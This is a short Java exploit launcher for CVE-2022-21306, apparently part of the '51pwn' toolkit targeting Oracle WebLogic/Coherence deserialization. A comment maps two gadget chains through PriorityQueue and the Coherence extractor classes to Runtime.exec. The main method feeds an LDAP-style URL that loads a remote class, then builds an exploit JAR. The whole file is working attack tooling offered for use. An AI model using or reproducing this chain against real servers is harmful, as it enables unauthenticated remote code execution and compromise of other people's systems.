package com._51pwn.CVE_2022_21306;

// CVE-2022-21306
/*

ObjectInputStream.readObject()
    PriorityQueue.readObject()
        PriorityQueue.heapify()
            PriorityQueue.siftDown()
                siftDownUsingComparator()
                    com.tangosol.util.comparator.ExtractorComparator.compare()
                        com.tangosol.util.extractor.ChainedExtractor.extract()
                            com.tangosol.util.extractor.ReflectionExtractor().extract()
                                Method.invoke()
    							.......
                            com.tangosol.util.extractor.ReflectionExtractor().extract()
                                Method.invoke()
                                Runtime.exec()

ObjectInputStream.readObject()
    PriorityQueue.readObject()
        PriorityQueue.heapify()
            PriorityQueue.siftDown()
                siftDownUsingComparator()
                    com.tangosol.util.extractor.AbstractExtractor.compare()
                      com.tangosol.util.extractor.MultiExtractor.extract()
                        com.tangosol.util.extractor.ChainedExtractor.extract()
                            com.tangosol.util.extractor.ChainedExtractor.extract()
                                com.tangosol.util.extractor.ReflectionExtractor().extract()
                                    Method.invoke()
    								.......
                                com.tangosol.util.extractor.ReflectionExtractor().extract()
                                    Method.invoke()
                                    Runtime.exec()
* */
public class Main1 {
    public static void main(String[] args) throws Exception {
        args = new String[]{"http://docker.for.mac.localhost:1389/UpX34defineClass"};
        Main.main(args);
        System.getProperties().put("jarName","CVE-2022-21306_PowerBy_51pwn.jar");
        com._51pwn.hktalent.CreatJar.main(args);
//        System.getProperties().put("jarName","CVE-2022-21350_powerBy_51pwn.jar");
//        com._51pwn.hktalent.CreatJar.main(args);
    }

}